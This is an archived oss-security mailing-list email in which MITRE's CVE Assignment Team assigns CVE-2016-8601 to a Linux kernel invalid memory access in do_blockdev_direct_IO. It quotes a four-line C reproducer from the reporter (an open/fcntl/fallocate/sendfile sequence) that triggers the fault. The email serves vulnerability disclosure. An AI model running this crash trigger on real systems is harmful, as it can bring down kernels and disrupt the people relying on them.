X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1369" "Tuesday" "11" "October" "2016" "12:27:08" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20161011162708.0C94F3AE011@smtpvbsrv1.mitre.org>" "35" "[oss-security] Re: linux kernel do_blockdev_direct_IO invalid memory access" nil nil nil "10" "2016101116:27:08" "[oss-security] Re: linux kernel do_blockdev_direct_IO invalid memory access" (number mark "U       cve-assign@m Oct 11   35/1369  " thread-indent "\"[oss-security] Re: linux kernel do_blockdev_direct_IO invalid memory access\"\n") "<CAFkTriL_sGQ=0ym3ALDXjWMYNJxKC3UH02Lx7v9Zj_CsX9NOiA@mail.gmail.com>" ("<CAFkTriL_sGQ=0ym3ALDXjWMYNJxKC3UH02Lx7v9Zj_CsX9NOiA@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 30289 invoked by uid 550); 11 Oct 2016 16:27:21 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30257 invoked from network); 11 Oct 2016 16:27:20 -0000
From: cve-assign@mitre.org
To: marco.gra@gmail.com
Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
In-Reply-To: <CAFkTriL_sGQ=0ym3ALDXjWMYNJxKC3UH02Lx7v9Zj_CsX9NOiA@mail.gmail.com>
Message-Id: <20161011162708.0C94F3AE011@smtpvbsrv1.mitre.org>
Date: Tue, 11 Oct 2016 12:27:08 -0400 (EDT)
Subject: [oss-security] Re: linux kernel do_blockdev_direct_IO invalid memory access

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> BUG: KASAN: wild-memory-access on address 0005080000000000
> https://gist.github.com/marcograss/40850adb3c599ac38e0beac31617d56b
> 
>   int fd = open("./hurrdurr", O_APPEND|O_RDWR|0x40);
>   fcntl(fd, 4, 0x44000, 0, 0, 0);
>   fallocate(fd, 0, 0x21, 0xafa6);
>   sendfile(fd, fd, &offset, 0x800);

Use CVE-2016-8601.

- -- 
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
  http://cve.mitre.org/cve/request_id.html ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJX/RJEAAoJEHb/MwWLVhi2yj0P/2qJJyACywfMz3qISvkHem8T
8vS2DrjBIC2LWMFAJZUuoI0qoA4sZ5B6MQKPEEbDE9F0GSwRWXMeddl1xjpEyhh1
BwVYgfRfjYZIdgo6HQnlP4BiFlArELn6PZqLxbP0JqvOVrdWKrI0Snw8oyV5KoO1
+oSbgpTiYIVsxfolgbk/LSSEuv7w+1KZMQGVmEpUt5aerASDbFlOYLRnXbgThaM9
BYjjpfYGJ7iC4F+MUwCOLH8BUw0QMQsUJ33AgjVvpCa9d/XajJN44ToBYfNghOYq
cGKUOtB7P6abUxVYPJWFWT7Hyn3d/OBsY4tE5Rx6yTfNg7z6MFjhdzhy92QclbqA
jJnKGvNSjUXoiBKh3SqZ/bL8pLlzVvXxkW8sjLlfIcKP8VicGRQtV7gphQnb6MXK
2rEp1qlTbNmyvnJ6HCLa83XjuYs81ngOzU3vXJ7BDhh0V5vLvyN1hwg9b+V4kL3A
6yrACwIWOwxyAvUaXLUn+jAO1LWIKmWYOf7ok1xbSNhRlD/x2/RON+CR05S7jEX9
QXTibJFWYNbslLPSYhgDSR7j8lLgbRmlppl/SFP5TBDeYB+FyvtnHCdRen/XCvZQ
mEN+1cBwmQ48w2X/gE8ZI957LCnWzJsbwFdrj9ECueVgf/P0vfE/4isxVsgbnOPe
ALHNeskNgkbeDnKt5ymx
=wgdQ
-----END PGP SIGNATURE-----
